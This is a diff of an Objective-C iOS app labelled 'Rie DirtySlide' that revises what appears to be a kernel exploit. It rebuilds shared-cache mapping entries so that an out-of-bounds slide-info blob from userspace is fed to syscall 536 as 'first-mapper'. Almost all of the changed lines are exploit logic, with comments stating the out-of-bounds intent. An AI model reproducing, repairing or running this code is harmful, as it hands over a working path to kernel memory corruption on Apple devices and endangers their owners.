@@ -142,7 +142,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v3 ==="];
+    [self log:@"=== Rie DirtySlide v4 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -499,14 +499,15 @@ typedef struct {
         }
 
         // ── Build file entries (kernel matches by POSITION order) ──
-        // file[0] → first N mappings, file[1] → next M, file[2] → next K
-        int mi = 0;  // mapping index
+        // BOTH mappings use the same cache fd — blob carrier reads page data
+        // from file offset 0 (content doesn't matter for OOB, only slide-info does)
+        int mi = 0;
 
-        // file[0]: cache fd for TEXT header
         if (fd_main >= 0) {
             c->files[0].sf_fd = fd_main;
-            c->files[0].sf_mappings_count = 1;
+            c->files[0].sf_mappings_count = 2;  // TEXT + blob carrier
             c->files[0].sf_slide = 0;
+
             // mapping[mi++]: TEXT header
             c->mappings[mi].sms_address     = 0x180000000ULL;
             c->mappings[mi].sms_size         = HDR_SZ;
@@ -514,27 +515,26 @@ typedef struct {
             c->mappings[mi].sms_max_prot     = 5;
             c->mappings[mi].sms_init_prot     = 1;
             mi++;
+
+            // mapping[mi++]: blob carrier with OOB slide-info
+            c->mappings[mi].sms_address     = BLOB_VA;
+            c->mappings[mi].sms_size         = 0x4000;
+            c->mappings[mi].sms_file_offset  = 0;  // read from cache fd (page data irrelevant)
+            c->mappings[mi].sms_slide_size   = blobSz;
+            c->mappings[mi].sms_slide_start  = (uint64_t)(uintptr_t)blob;  // userspace slide-info
+            c->mappings[mi].sms_max_prot     = 5;
+            c->mappings[mi].sms_init_prot     = 3;
+            mi++;
         } else {
             c->files[0].sf_fd = -1;
             c->files[0].sf_mappings_count = 0;
             c->files[0].sf_slide = 0;
         }
 
-        // file[1]: in-memory blob carrier with OOB slide-info
-        {
-            c->files[1].sf_fd = -1;
-            c->files[1].sf_mappings_count = 1;
-            c->files[1].sf_slide = 0;
-            // mapping[mi++]: blob carrier
-            c->mappings[mi].sms_address     = BLOB_VA;
-            c->mappings[mi].sms_size         = 0x4000;
-            c->mappings[mi].sms_file_offset  = (uint64_t)(uintptr_t)blob;
-            c->mappings[mi].sms_slide_size   = blobSz;
-            c->mappings[mi].sms_slide_start  = (uint64_t)(uintptr_t)blob;
-            c->mappings[mi].sms_max_prot     = 5;
-            c->mappings[mi].sms_init_prot     = 3;
-            mi++;
-        }
+        // file[1]: unused
+        c->files[1].sf_fd = -1;
+        c->files[1].sf_mappings_count = 0;
+        c->files[1].sf_slide = 0;
 
         // file[2]: unused
         c->files[2].sf_fd = -1;
@@ -547,8 +547,8 @@ typedef struct {
             [self log:@"cache fd not found, using fd=-1 (in-memory)"];
         }
 
-        [self log:[NSString stringWithFormat:@"cfg: file[0].count=%d file[1].count=%d total=%d fd_main=%d blob@0x%llx",
-            c->files[0].sf_mappings_count, c->files[1].sf_mappings_count, totalMappings, fd_main, BLOB_VA]];
+        [self log:[NSString stringWithFormat:@"cfg: file[0].count=%d total=%d fd_main=%d blob=%p blob@0x%llx",
+            c->files[0].sf_mappings_count, totalMappings, fd_main, blob, BLOB_VA]];
 
         // ── Call syscall 536 — first-mapper ──
         [self log:@"\n!! CALLING syscall(536) as first-mapper... !!"];
